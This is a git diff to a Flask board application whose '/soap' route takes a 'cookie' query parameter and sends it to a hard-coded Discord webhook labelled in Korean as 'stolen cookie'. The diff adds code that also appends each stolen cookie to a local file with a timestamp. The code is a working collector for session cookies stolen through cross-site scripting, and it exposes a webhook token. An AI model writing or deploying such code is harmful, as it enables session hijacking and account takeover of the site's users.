@@ -4,6 +4,7 @@ from flask import current_app
 from datetime import datetime, timedelta
 from . import db  # db 인스턴스 import
 import os
+import requests
 
 login_attempts = {}
 
@@ -233,20 +234,25 @@ def delete_post(post_id):
         db.session.commit()
     return redirect(url_for('main.board'))
 
-import requests
-
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1389488881518514216/Ci1OjrfMxlnoXuT86w5mjtOUfHWxpJO_Ga6FTm5tghHd1CL59T3uD4mXLNevyIGa_QFU'
 
 def send_to_discord(message):
     data = {
-        "content": f"탈취한 쿠키: `{message}`"
+        "content": f" 탈취한 쿠키: `{message}`"
     }
     requests.post(WEBHOOK_URL, json=data)
+
+def save_to_file(message):
+    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+    with open("cookie.txt", "a") as f:
+        f.write(f"[{now}] {message}\n")
 
 @main.route('/soap')
 def log_cookie():
     cookie = request.args.get('cookie')
     if cookie:
         send_to_discord(cookie)
-        return 'Cookie sent', 200
+        save_to_file(cookie)
+        return 'Cookie sent and saved', 200
     return 'No Cookie exists', 400
+
